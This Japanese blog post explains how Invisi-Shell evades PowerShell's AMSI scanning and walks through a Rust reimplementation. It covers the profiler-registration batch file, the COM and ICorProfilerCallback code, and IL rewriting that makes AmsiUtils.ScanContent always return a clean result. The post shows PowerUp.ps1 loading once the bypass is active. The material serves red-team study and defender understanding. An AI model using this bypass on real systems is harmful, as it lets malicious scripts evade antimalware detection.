---
title: "Invisi-Shellを理解する"
id: "CLR-Profile-API"
description: "Invisi-Shellを再実装してAMSIをバイパスしてみた"
author: "rikoteki"
createdAt: "2025-04-28"
isDraft: false
---

# はじめに

## CRTPで説明されたInvisi-Shell

CRTPというADに対する攻撃に主眼を置いた資格試験のラボをやっていた

この試験では基本的なWindowsの侵入検知機構が有効になっておりそれらをバイパスした上で目的を達成する必要がある

[Certified Red Team Professional (CRTP)](https://www.alteredsecurity.com/post/certified-red-team-professional-crtp)

読む資料や取り組むラボの順番を間違えたかもしれんが、唐突に「AMSIに検知されるから最初にこのツール実行しろ」と説明されていて無事スクリプトキディに

[OmerYa/Invisi-Shell: Hide your Powershell script in plain sight. Bypass all Powershell security features](https://github.com/OmerYa/Invisi-Shell)

(ちなみにこのツールにはAMSI以外の検知処理を無効化する仕組みも入っているが今回はAMSIにフォーカスした)

## Invisi-Shellの仕組みに対する興味

AMSIバイパスの手法には一番有名なものとして`AmsiScanBuffer`関数の先頭アドレスを取得して`VirtualProtect`や`memcpy`を使用してでパッチを当てるというバイパス手法があるが、Invisi-Shellのコードを見た感じ少し異なる手法を取っていたので見てみた

# 免責事項

本記事は純粋に教育・研究目的で作成されています。ここで解説する技術や手法は、情報セキュリティ専門家やIT管理者がシステムの脆弱性を理解し、適切な防御策を講じるための知識提供を目的としています。
以下の点にご注意ください：

1. 本記事で紹介する手法を許可なく第三者のシステムに対して実行することは、法律違反となる可能性があり、民事・刑事上の責任が生じる場合があります
2. すべての実験や検証は、自己所有または正式に許可を得た環境でのみ行ってください
3. 本記事の情報を悪用して不正アクセスや情報漏洩などの違法行為を行った場合、その責任は行為者自身が負うものとし、著者および掲載媒体は一切の責任を負いません
4. 本記事は最新の情報提供に努めていますが、セキュリティ技術は日々進化しているため、実際の適用にあたっては最新の情報を確認することをお勧めします

本記事の目的は、サイバーセキュリティへの理解を深め、より安全なデジタル環境の構築に貢献することにあります。知識は適切に活用されることを前提に共有されています。

# 1. Invisi-Shellとは

## 概要と背景

Invisi-Shellの使い方はdllとbatを配置した後、batを実行するだけだが、bat内では環境変数設定、レジストリ書き込みだけしてpowershell起動しているだけだった

付属のDLLへのパスがレジストリに書き込まれていたので恐らくDLLがバイパス処理の実体だろう

RunWithRegistryNonAdmin.bat

```powershell
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
```

後でDLLも見ていくがとりあえず環境変数`COR_ENABLE_PROFILING`と`COR_PROFILER`が気になったので調べると、「プロファイルAPI」という機能が.NET Framework環境に存在することを知った

[プロファイル (アンマネージ API リファレンス) - .NET Framework | Microsoft Learn](https://learn.microsoft.com/ja-jp/dotnet/framework/unmanaged-api/profiling/)

## 使用されているセキュリティバイパスの手法

プロファイルAPIは割と古い技術で、調べるといろいろな方が実装されていた

[うらぶろぐ @urasandesu: 10月 2011](https://urasandesu.blogspot.com/2011/10/)

[Windowsで、実行ファイルを書き換えずに既存の.Netアプリケーションの関数を置き換える話 - math314のブログ](https://math314.hateblo.jp/entry/2017/01/22/005048)

上記のブログに書かれているが、プロファイルAPIを使用するとCLRによってJITコンパイルされる前のILコードを書き変え、関数の処理を変更することができるらしい

Invisi-Shellはこの手法を用いて検知等に使用されている関数の処理を書き変えていることが分かった

# 2. 技術的基盤：CLRプロファイラAPI

## CLRプロファイルAPIの役割と機能

プロファイルAPIは本来.NET実行環境の内部動作を監視・分析・操作するためのインターフェースであり、アプリケーションの性能分析やデバッグなどに使用することを目的として開発されたようである

[プロファイル (アンマネージ API リファレンス) - .NET Framework | Microsoft Learn](https://learn.microsoft.com/ja-jp/dotnet/framework/unmanaged-api/profiling/)

プロファイルAPIのアーキテクチャは、主に以下の要素で構成されている

- CLR(共通言語ランタイム=.NET実行環境)
- CLRにより実行される.NETアプリケーション
- プロファイラ(今回実装する対象)

![Pasted image 20250410131159](https://github.com/user-attachments/assets/304e6d78-c8e4-4e8e-ac9c-1185520a00e1)

引用元: https://learn.microsoft.com/ja-jp/dotnet/framework/unmanaged-api/profiling/media/profiling-overview/profiling-architecture.png

今回の関心対象はプロファイラなのでその実装と機能を中心に詳しく見ていく

### プロファイラの初期化と登録

まずCLRはプログラム実行時に特定の環境変数が設定されている場合、それらの値とレジストリの情報を基にプロファイラを読み込む

(一般的にプロファイラはDLLの形式で提供されている)

環境変数の値

```
COR_ENABLE_PROFILING=1
COR_PROFILER={プロファイラのCLSID}
```

レジストリエントリ

```
HKCU\Software\Classes\CLSID\{プロファイラのCLSID}
HKCU\Software\Classes\CLSID\{プロファイラのCLSID}\InprocServer32 // プロファイラDLLへのパス
```


Invisi-Shellの`RunWithRegistryNonAdmin.bat`ではレジストリに`CLSID`や`InProcServer32`への書き込みがあるが、これはプロファイラDLL内にCOMオブジェクトが定義されていることを示している

また、このCOMオブジェクトにはプロファイラとして動作するためのインターフェース`ICorProfilerCallback`が実装されている必要がある

[ICorProfilerCallback Interface - .NET Framework | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/icorprofilercallback-interface)

このインターフェースを実装していることにより、CLRがプロファイラDLLを読み込んだ後、`ICorProfilerCallback`経由で実行時の情報がやり取りできる

## 実行時ILコード書き換えのメカニズム

.NETアプリケーションの実行時、JITコンパイラによってILコードがネイティブコードに変換される

`ICorProfilerCallback`インターフェースにはこの変換プロセスにおいてフックするポイントが複数用意されている

ILの書き換えにおいて重要なのは`ICorProfilerCallback::JITCompilationStarted`関数である

```c++
HRESULT JITCompilationStarted( [in] FunctionID functionId, [in] BOOL fIsSafeToBlock);
```

[ICorProfilerCallback::JITCompilationStarted Method - .NET Framework | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/icorprofilercallback-jitcompilationstarted-method)

このコールバックは関数がJITコンパイルされる前にその関数の`functionId`を引数として呼び出されるため、この関数を実装することでJITコンパイル前にILコードを書き変えることができる(詳細な実装は後述)

# 3. 再実装に必要な技術要素

ここまででプロファイラとしてCLRに読み込ませるためには以下が必要であることが分かった

1. DLLとしての実装(多分EXEでもいい？)
2. COMオブジェクトの実装
3. 2で実装したCOMオブジェクトへの`ICorProfilerCallback`インターフェースの実装
4. `ICorProfilerCallback::JITCompilationStarted`内での対象ILの書き換え

## DLLの基礎知識

まず最小のDLLを実装できる必要がある

[ダイナミック リンク ライブラリ (DLL) - Windows Client | Microsoft Learn](https://learn.microsoft.com/ja-jp/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library)

C++での実装例は以下の通りでこのシグネチャに則った`DllMain`関数をエクスポートすればプロセスやスレッドがDLLにアタッチ、デタッチした際に呼び出される処理を記述できる

```c++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACHED: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACHED: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

ただ、今回はDLLとしてアタッチ、デタッチされる際の処理は不要なので省略しても問題ない

COMオブジェクトとして動作させるために後述する関数をエクスポートする

また、上記の例はC++実装なのでRust実装に変換する必要がある

## COMインターフェイスの理解

以下の公式説明を読んでもなんだかピンとこないがClaudeが要約するに
`COM（Component Object Model）はMicrosoftが開発したバイナリインターフェース規格で、異なるプログラミング言語で書かれたソフトウェアコンポーネント間の通信を可能にする技術`らしい 

[COM の技術概要 - Win32 apps | Microsoft Learn](https://learn.microsoft.com/ja-jp/windows/win32/com/com-technical-overview)

[コンポーネント オブジェクト モデル (COM) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/ja-jp/windows/win32/com/component-object-model--com--portal)

たしかにCLRとC++の連携を提供しているし、今回実装するプロファイラはRust製だがCLRやC++で書かれたCOMオブジェクトと通信が可能だ

COMには大別して`インターフェース`と`クラス`、`オブジェクト`という概念があるらしい

この辺は調べた感じプログラミング言語によくあるそれらとほぼ同じ概念だろう

### COMインターフェース

COMインターフェースは一般的なインターフェースと同様にCOMクラスに対して実装する関数を定義する

システム内で名前が重複してもいいように各COMインターフェースには`IID`と呼ばれる128bitのGUIDを設定する必要があり、この`IID`で識別される

COMインターフェースは継承が可能で、インターフェースAを継承したインターフェースBにはインターフェースAの関数を実装することが強制される

[Interfaces (COM) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/interfaces)

ただし、複数のインターフェースを継承することはできないっぽい

今回実装する`ICorProfilerCallback`にも現在`ICorProfilerCallback9`までが存在しており、おそらく`ICorProfilerCallback9`が`ICorProfilerCallback8`を継承し、`ICorProfilerCallback8`が`ICorProfilerCallback7`を継承し…のように単一継承の制限があるのでこのように機能を拡張していってるのかな？

### COMクラス

COMインターフェースを実装した実体

COMインターフェースを実装したCOMクラスはCOMインターフェースで定義されている関数の実装を全て提供する必要がある

COMクラスには`IID`と同様に`CLSID`と呼ばれる128bitのGUIDを定義する必要がある

COMクラスを呼び出す側は主にこのCLSIDを用いて呼び出すクラスを識別している

「プロファイラの登録と初期化」の章でプロファイラのCLSIDをレジストリに登録する必要があると書いたが、このことからプロファイラはCOMクラスとして提供されていることがわかる

プロファイラを実装する場合、`CLSID`からCOMクラスのインスタンスを作成するために`IClassFactory`を実装したCOMクラスを定義する必要がある

これはCLRがプロファイラを読み込もうとする際、CLRが`CoGetClassObject`などの方法を用いずにCOMオブジェクトを取得しようとすることに起因すると思われる(以下にIClassFactoryを実装する必要がある場合について記載有)

[COM クラス オブジェクトと CLSID - Win32 apps | Microsoft Learn](https://learn.microsoft.com/ja-jp/windows/win32/com/com-class-objects-and-clsids)

### COMオブジェクト

COMクラスの定義から実行時にメモリ上に作成されたオブジェクト

一般的なオブジェクト指向プログラミング言語に合わせるならインスタンスとも言える

### COMクラスオブジェクト

こいつが一番ややこしい(主に名前が)

クラスオブジェクトはその他のCOMオブジェクトのインスタンスを作成する役割を持つ。クラスオブジェクトはこの役割を`IClassFactory`インターフェースを実装することで提供する。

COMクライアントが`CoCreateInstance`関数などでCOMクラスを初期化しようとすると、そのCOMクラスが直接初期化されずCOMクラスオブジェクトを経由して初期化されるらしい

### IUnknownインターフェース

全てのCOMインターフェースが継承しているインターフェース

以下の三つの関数を定義しており`QueryInterface`によって他のインターフェースのポインタを取得し、その実装を使用することができる

```c++
HRESULT QueryInterface(REFIID riid, void **ppvObject);
ULONG AddRef(); 
ULONG Release();
```

その他の関数は自身の参照を管理するカウンタのようなもの

後述の`windows-rs`を使えばこの辺はクレート側で管理してくれるっぽい

---

再実装に必要な情報はあらかた調べ終わったので今度はRustで実装するにはどうするか調べながら実装していく

`ICorProfilerCallback`の詳しい実装も実装しながら見ていく

# 4. Rustでの実装への道

まずRustでDLLやWindows APIを使用するためにMicrosoft公式の`windows-rs`クレートを使用することにした

以前にAMSI Providerを作成した際にも同クレートを使用したため、ある程度使用方法は分かっている(つもり)

[windows - Rust](https://microsoft.github.io/windows-docs-rs/doc/windows/)

## プロジェクトの準備

`windows-rs`クレートのドキュメントに沿って実装していく

[Creating your first DLL in Rust - Kenny Kerr](https://kennykerr.ca/rust-getting-started/creating-your-first-dll.html)

重要なの要素は以下

- libクレートとしてプロジェクトを作成する
- Cargo.tomlのlibセクションに`crate-type = ["cdylib"]`を指定する

cargo generateを使ってDllMainを持つ初期コードを生成しても良い

```sh
cargo install cargo-generate

cargo generate --git https://github.com/r1k0t3k1/rust-windows-template.git
```
## 実装詳細

プロファイラ初期化の順で見ると以下の実装が必要

- DLLとしてビルド、DllGetClassObject関数の実装
- IClassFactoryインターフェースを実装したファクトリクラス
- ICorProfilerCallbackインターフェースを実装したクラス

プロファイラとしての処理の流れを図示するとこんな感じ

![image](https://github.com/user-attachments/assets/a618cf63-80fb-4125-a7dd-a700d9acdb2b)

## DLLとしての実装

以下に則った関数を実装すればOK

- エクスポートする関数に`#[no_mangle]`アトリビュートを設定し、関数名のマングリングを抑制する
- 関数定義の先頭に`extern "system"`を付与し、呼び出し規約を明示

関数実装例
```rust
#[no_mangle]
extern "system" fn Hello() -> HRESULT {
	E_NOTIMPL
}
```

ここまででビルドすれば指定した関数がエクスポートされたDLLが生成できる

![image](https://github.com/user-attachments/assets/6e2d1d72-ebc2-4b3a-8a5d-8a6908194f6e)

### DllGetClassObjectの実装

CLRがDLLをロードした際に最初に呼ばれるエクスポート関数

Rustにおける関数シグネチャは以下の通り

```rust
#[no_mangle]
extern "system" fn DllGetClassObject(
    rclsid: *const GUID,
    riid: *const GUID,
    ppv: *mut c_void,
) -> HRESULT
```

- rclsid -> CLRが読込を要求するプロファイラのCLSID
- riid   -> `rclsid`のCOMオブジェクトが実装するインターフェースID(試した限りではIUnknownのIIDになる模様)
- ppv    -> `riid`のインターフェースを指すポインタを返す

現時点では返すCOMオブジェクトが実装できていないので`E_NOTIMPL`を返すように実装しておく

```rust
#[no_mangle]
extern "system" fn DllGetClassObject(
    rclsid: *const GUID,
    riid: *const GUID,
    ppv: *mut c_void,
) -> HRESULT {    
	E_NOTIMPL
}
```

### IClassFactoryの実装

CLRから呼び出された`DllGetClassObject`関数の第一引数`rclsid`はレジストリに登録したプロファイラのCLSIDになる

そして、`riid`には`ICorProfilerCallback`のIIDではなく、`IClassFactory`のIIDが指定される

`DllGetClassObject`が呼び出された際の`rclsid`および`riid`
![image](https://github.com/user-attachments/assets/5442bc25-0d5d-4617-93bd-e8733d9725c8)

なぜ直接`ICorPrfilerCallback`のインターフェースが要求されないのかが疑問だがこれがCOMにおけるインスタンス作成のお作法らしい。

https://learn.microsoft.com/ja-jp/windows/win32/com/implementing-iclassfactory

`windows-rs`クレートを使用した実装は以下のようになる

Structを定義し、`implement`マクロに実装したいインターフェースを指定し、実装を書くだけだったので楽だった

プロファイラの実装が終わったら、`CreateInstance`関数でプロファイラのインスタンスを返すようにする

```rust
#[implement(IClassFactory)]
pub struct AchtungBabyClassFactory {}

impl IClassFactory_Impl for AchtungBabyClassFactory_Impl {
    fn CreateInstance(
        &self,
        punkouter: Ref<'_, IUnknown>,
        riid: *const GUID,
        ppvobject: *mut *mut c_void,
    ) -> windows_core::Result<()> {
        // [snip]
    }

    fn LockServer(&self, _flock: windows_core::BOOL) -> windows_core::Result<()> {
        Ok(())
    }
}
```

### ICorProfilerCallbackの実装

`IClassFactory`の実装と同様の方法が使える

`ICorProfilerCallback`の場合は実装しなければいけないインターフェースが少し多くなる

が、大半の関数はIDEの自動実装機能で導出できるし、使わない関数なら中身は空実装(`Ok(())`を返すだけなど)で良い

```rust
#[implement(
    ICorProfilerCallback5,
    ICorProfilerCallback4,
    ICorProfilerCallback3,
    ICorProfilerCallback2,
    ICorProfilerCallback
)]
pub struct AchtungBabyProfiler {
    profiler_info: OnceLock<ICorProfilerInfo3>,
}

impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
    fn Initialize(
        &self,
        picorprofilerinfounk: windows_core::Ref<'_, windows_core::IUnknown>,
    ) -> windows_core::Result<()> {
        // [snip]
    }

// 同様に70関数程度を自動実装
```

中身の実装が必要な関数は以下

- ICorProfilerCallback::Initialize
- ICorProfilerCallback::JITCompilationStarted
- ICorProfilerCallback::JITCompilationFinished(JITコンパイルされたネイティブコードを確認するため、なくてもいい)

#### ICorProfilerCallback::Initializeの実装

CLRがプロファイラを初期化する際に呼ばれる関数

https://learn.microsoft.com/ja-jp/dotnet/framework/unmanaged-api/profiling/icorprofilercallback-initialize-method

第一引数には`ICorProfilerInfo`インターフェースに変換可能な`IUnknown`インターフェースへのポインタが設定される

`Initialize`関数内ではCLRが発生させるプロファイラに関するイベント通知において、どのイベント通知を受け取るかを設定する必要がある

それができるのは`ICorProfilerInfo::SetEventMask`関数のみであり、`ICorProfilerInfo`が取得できるタイミングはこの`Initialize`関数の呼び出し時のみ

コールバック関数においても`ICorProfilerInfo`は使用するのでCOMクラスの構造体に格納するなどして保持しておく

※ちなみに`windows-rs`の`IUnknown`は`cast`関数で安全にインターフェースを変換することができる
内部的には`QueryInterface`関数を呼んでいるはずなのでただのラッパーかと

```rust
profiler_info.cast::<ICorProfilerInfo3>()?
```

取得した`ICorProfilerInfo`インタフェースから`SetEventMask`を実行する

引数には購読したい通知をビットマスクで指定する

一番重要なのは`COR_PRF_MONITOR_JIT_COMPILATION`である
このイベントを購読するとJITコンパイルの開始通知を受け取ることができる

```rust
unsafe {
    self.get_profiler_info().unwrap().SetEventMask(
        COR_PRF_MONITOR_ASSEMBLY_LOADS.0 as u32 |  // アセンブリの読み込み通知を購読
        COR_PRF_MONITOR_JIT_COMPILATION.0 as u32 | // JITコンパイルの開始通知を購読
        COR_PRF_USE_PROFILE_IMAGES.0 as u32,       // NGENにより予めJITコンパイルされたライブラリにおいてもJITコンパイルさせる
    )?
};
```

##### ハマりポイント！

`COR_PRF_USE_PROFILE_IMAGES`はNGENによりJITコンパイル結果がキャッシュされているイメージにおいてもJITコンパイルさせるようにする

https://learn.microsoft.com/ja-jp/dotnet/framework/tools/ngen-exe-native-image-generator

今回フックしたい`ScanContent`はSMA.dllに定義されているがこれはNGENにより事前コンパイル結果がキャッシュされてしまっているため、このビットマスクを指定しないとJITコンパイルイベント通知が発生しない

![image](https://github.com/user-attachments/assets/c267c488-6b4f-4980-ac94-585f5fcf0f34)

#### ICorProfilerCallback::JITCompilationStartedの実装

`SetEventMask`関数で正しく購読設定ができている場合は関数のJITコンパイル時に`JITCompilationStarted`関数が呼ばれる
このとき`functionId`はコンパイル対象の関数の値が設定されるのでこの値を元にILの書き換えを行っていく

```c++
HRESULT JITCompilationStarted(
    [in] FunctionID functionId,
    [in] BOOL       fIsSafeToBlock);
```

IL書き換えの詳細については後述

大まかな流れは以下の通り

1. `functionId`を引数に`ICorProfilerInfo::GetFunctionInfo`を呼び出し、`moduleId`と関数のメタデータトークンへのポインタ`pToken`を取得
2. 1で得た`moduleId`と`pToken`を引数として`GetILFunctionBody`関数を呼び出し、関数の先頭アドレスとサイズを取得
3. 2で得た関数のヘッダ部分をコピーするか、新規に定義してコピー先関数用の関数ヘッダを作成する
4. 関数ヘッダと自身で定義したIL(関数本体)を連結し、`SetILFunctionBody`関数で`functionId`の関数のポインタを上書きする

#### ICorProfilerCallback::JITCompilationFinishedの実装

この関数ではJITコンパイル結果を確認するだけ

`functionid`でJITコンパイル済みの関数IDが渡ってくる

```rust
fn JITCompilationFinished(
    &self,
    functionid: usize,
    _hrstatus: windows_core::HRESULT,
    _fissafetoblock: windows_core::BOOL,
) -> windows_core::Result<()> {
    // [snip]
}
```

渡ってきた`functionid`を引数として`ICorProfilerInfo::GetCodeInfo2`を呼び出すことでネイティブコードの配置アドレスが取得できる

https://learn.microsoft.com/ja-jp/dotnet/framework/unmanaged-api/profiling/icorprofilerinfo2-getcodeinfo2-method

関数の先頭アドレスから取得したバイナリを適当なディスアセンブラに通すとネイティブコードが再現できる

![image](https://github.com/user-attachments/assets/379914c1-8a98-41ba-bf39-8bcc971864d1)

### IL Rewriting

#### IL書き換え対象の関数

今回は`System.Management.Automation.dll`に定義されている`AmsiUtils.ScanContent`関数をIL書き換えの対象にする

この関数は内部で`amsi.dll`の`AmsiScanBuffer`関数を呼び出しており、`ScanContent`関数をバイパスすると`AmsiScanBuffer`関数の呼び出しをスキップでき、結果としてAMSIの検証をパスすることができる

以下の関数リファレンスを辿った図からも`ScanContent`関数が`ScriptBlock.Compile`関数などから間接的に呼び出されていることがわかる

![image](https://github.com/user-attachments/assets/08edcbd7-4372-411b-b156-7142ebe3140e)

おそらくPowerShellコンソールから入力したスクリプトはすべてこの`Compile`関数を経由して`ScanContent`関数に渡ると思われる

`ScanContent`関数のシグネチャは以下の通りで戻り値の`AMSI_RESULT`がAMSIスキャンの結果を表していると思われる

![image](https://github.com/user-attachments/assets/3963e920-63fa-46bd-84e7-78cf46ae32d6)

`AMSI_RESULT`の定義は`System.Management.Automation.AmsiUtils.AmsiNativeMethods`の中にある

これを見るにu32の0が`AMSI_CLEAN`なので`ScanContent`関数が固定で0を返すようにILを書き換えれば良さそうなことがわかった

![image](https://github.com/user-attachments/assets/fc480011-2a4c-4553-9860-7709e372ec51)

#### IL書き換えの詳細実装

`ICorProfilerCallback::JITCompilationStarted`の詳細実装を説明する

> 1. `functionId`を引数に`ICorProfilerInfo::GetFunctionInfo`を呼び出し、`moduleId`と関数のメタデータトークンへのポインタ`pToken`を取得
> 2. 1で得た`moduleId`と`pToken`を引数として`GetILFunctionBody`関数を呼び出し、関数の先頭アドレスとサイズを取得
> 3. 2で得た関数のヘッダ部分をコピーするか、新規に定義してコピー先関数用の関数ヘッダを作成する
> 4. 関数ヘッダと自身で定義したIL(関数本体)を連結し、`SetILFunctionBody`関数で`functionId`の関数のポインタを上書きする

1,2は特に難しい操作はないが、この処理の中でILを書き換える関数を識別する必要がある

詳細は省略するが`functionId`を元に`ICorProfilerInfo::GetTokenAndMetaDataFromFunction`関数や`IMetaDataImport2::GetMethodProps`関数、`IMetaDataImport2::GetTypeDefProps`関数を使用することで関数が定義されている名前空間や関数名が取得できるため、それを用いて目的の関数を識別する

3,4のIL書き換えにあたっては`ICorProfilerInfo::SetILFunctionBody`関数を使用する

この関数を使用することで関数が指すILメソッドを変更することができ、結果として関数の処理を変更することができる

第一引数は`ICorProfilerInfo::GetFunctionInfo`関数で取得した`moduleID`、第二引数がわかりづらいがこれも上記関数の呼び出しで取得した`pToken`(関数のメタデータトークンへのポインタ)を設定する

第三引数には新しく用意したILメソッドへのポインタを設定する

```c++
HRESULT SetILFunctionBody(  
    [in] ModuleID    moduleId,  
    [in] mdMethodDef methodid,  
    [in] LPCBYTE     pbNewILMethodHeader);
```

では新しいILメソッドはどのようにして用意するか

前提として、ILメソッドはILメソッドヘッダとILメソッドボディから構成されており、これらを適切に設定する必要がある

これにあたって以下を試してみた

- ILメソッドヘッダを元のILメソッドからコピ―し、ILメソッドボディのみを変更する方法
- ILメソッドヘッダ、ILメソッドボディ共に自身で定義する方法

前者のRustでの実装例は以下

ILメソッド先頭アドレスからサイズ分のバイト列を`IMAGE_COR_ILMETHOD`として取得して複製しているだけ

```rust
unsafe {
    self.get_profiler_info().unwrap().GetILFunctionBody(
        pmoduleid, 
        ptoken, 
        &mut ppmethodheader, 
        &mut pcbmethodsize
    )?;
}

let il_bytes = unsafe { std::slice::from_raw_parts(ppmethodheader, pcbmethodsize as usize) };
let il_method = unsafe { *(il_bytes.as_ptr() as *const IMAGE_COR_ILMETHOD) };

let mut cloned_header = il_method.clone();
// cloned_headerとILメソッドボディを連結してSetILFunctionBodyを呼ぶ
```

難しかったのは後者の方で、ILメソッドヘッダの理解が必要

ILの仕様は以下の資料で定義されている

https://ecma-international.org/publications-and-standards/standards/ecma-335/

`II.25.4.1`にて、ILメソッドには`Tiny`と`Fat`、２つのフォーマットが存在することがわかる

それぞれILメソッドがどちらのフォーマットになるかの条件は以下の通り

- Tinyフォーマット(以下のすべてに当てはまる場合)
    - ローカル変数が存在しない
    - 例外が存在しない
    - 拡張データセクションが存在しない(?)
    - 評価スタックの深さが8を超えない
- Fatフォーマット(以下のいずれかに当てはまる場合)
    - ILメソッドのサイズが64byteを超える
    - 例外が存在する
    - 拡張データセクションが存在する(?)
    - ローカル変数が存在する
    - 評価スタックの深さが8を超える

今回定義するILメソッドボディはEAXに0を設定してリターンするのみ、といった単純な関数であり、Tinyフォーマットで十分である

Tinyフォーマットの場合、ヘッダ全体のサイズは1byteとなり、そのうち先頭2bitでTinyフォーマットを示す`0x02`、後続6bitでメソッドボディのサイズを示す

![image](https://github.com/user-attachments/assets/0a1295bc-db49-4a36-bfdc-c429ab221032)

試しに以下のような関数をビルドしてみた

![image](https://github.com/user-attachments/assets/a4e95ff6-f031-4b5d-a703-23a34538a6b4)

ビルドした結果生成されたILは以下のようになりTinyフォーマット(ヘッダが1byteのため)でコードサイズが4byteとなった

![image](https://github.com/user-attachments/assets/7e2dfa8c-4e80-494c-9ebe-70f5aae7bd42)

その場合Tinyヘッダの値は`0b00010010`=`0x12`となるはず

当該関数の実行ファイルにおけるファイルオフセットをHEXエディタ等で確認すると計算通り`0x12`となっていた

![image](https://github.com/user-attachments/assets/9ff501eb-4337-4675-89f1-ad678eeb8226)


そのためRustでは以下のようなu8の数値を定義するだけでOK

```rust
// メソッドボディサイズのビットは定義するILメソッドボディによって変える
let tiny_header = 0b001010_u8;
```

続いてILメソッドボディの実装

ILはアセンブリのように一つ一つの命令からなるバイト列なので、下記を参照しながら目的に沿った処理を実行できるように命令列を組み合わせていく

https://learn.microsoft.com/ja-jp/dotnet/api/system.reflection.emit.opcodes?view=net-9.0

今回は単純に戻り値として0を返すだけのILメソッドを定義したいのでILオペコードは以下のようになる

```
0x16 // 評価スタックに0をPUSH
0x2a // ret
```

これを踏まえ、定義するILメソッド全体の定義は以下のようになる

```rust
let new_il: [u8; 3] = [
    0b00001010, // tiny method header and code size
    0x16,       // push 0 to stack top
    0x2a,       // ret
];
```

続いてILメソッドの書き換え

まず`GetILFunctionBodyAllocator`を使用してメモリアロケータを取得する
アロケータで確保したメモリ領域に新しく定義したILメソッドを書き込む
`SetILFunctionBody`を使用して書き込み先の先頭アドレスを関数が指すILメソッドとして上書きする

```rust
let method_alloc = unsafe {
    self.get_profiler_info()
        .unwrap()
        .GetILFunctionBodyAllocator(pmoduleid)?
};

let allocated = unsafe { method_alloc.Alloc(new_il.len() as u32) as *mut u8 };

unsafe { std::ptr::copy_nonoverlapping(new_il.as_ptr(), allocated, new_il.len()) };

unsafe {
    // ILの本体を差すポインタを上書きする
    let r = self
        .get_profiler_info()
        .unwrap()
        .SetILFunctionBody(pmoduleid, ptoken, allocated);
    if r.is_err() {
        println!("{:?}", r);
    }
};
```

ここまで定義ができたらビルドしてbatを呼び出すことでILコードから生成されるネイティブアセンブリが意図したように書き換えられていることがわかる

![image](https://github.com/user-attachments/assets/379914c1-8a98-41ba-bf39-8bcc971864d1)

途中に挟まれている`call`命令が気になるが調べてみたらCLRが挿入するGCに関する処理っぽい(現在のAppDomainを取得する処理をインラインで記述して高速化を図っている？)

このへんよくわかってない

![image](https://github.com/user-attachments/assets/50c6c1b3-e41a-4b98-be9b-dc0b0da08bce)

JIT_GetSharedNonGCStaticBase_InlineGetAppDomainの定義

[coreclr](https://github.com/dotnet/coreclr/blob/4b49e4330441db903e6a5b6efab3e1dbb5b64ff3/src/vm/amd64/JitHelpers_InlineGetAppDomain.asm)

### 全体の実装まとめ

1. エクスポート関数`DllGetClassObject`を実装し、`IClassFactory`を返却する
2. `IClassFactory`を実装し、`CreateInstance`関数でプロファイラを返却する
3. プロファイラに`ICorProfilerCallback`を実装する
4. プロファイラに`ICorProfilerCallback::Initialize`を実装し、購読したいイベントを設定する
5. プロファイラに`ICorProfilerCallback::JITCompilationStarted`を実装し、ILを書き換える
6. プロファイラに`ICorProfilerCallback::JITCompilationFinished`を実装し、書き換えたILを確認する(オプション)

## 検証

![image](https://github.com/user-attachments/assets/719bdf45-e651-47a6-90bb-77af78235c9f)

上記の画像では最初に素のPowerShellから`PowerUP.ps1`を読み込ませようと試みたが、`This script contains malicious content and ...`と表示されスクリプトの読み込みがブロックされたことがわかる

一方で、プロファイラをアタッチしたPowerShell上では`PowerUP.ps1`を読み込むことに成功していることがわかる

`Get-UnquotedService`や`Get-ModifiableServiceFile`コマンドレットが利用できることも確認した

成果物

https://github.com/r1k0t3k1/AchtungBaby

# 参考

https://github.com/OmerYa/Invisi-Shell

https://learn.microsoft.com/ja-jp/dotnet/framework/unmanaged-api/profiling/

https://urasandesu.blogspot.com/2011/10/

https://math314.hateblo.jp/entry/2017/01/22/005048

https://learn.microsoft.com/ja-jp/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library

https://learn.microsoft.com/ja-jp/windows/win32/com/com-technical-overview

https://learn.microsoft.com/ja-jp/windows/win32/com/component-object-model--com--portal

https://kennykerr.ca/rust-getting-started/creating-your-first-dll.html

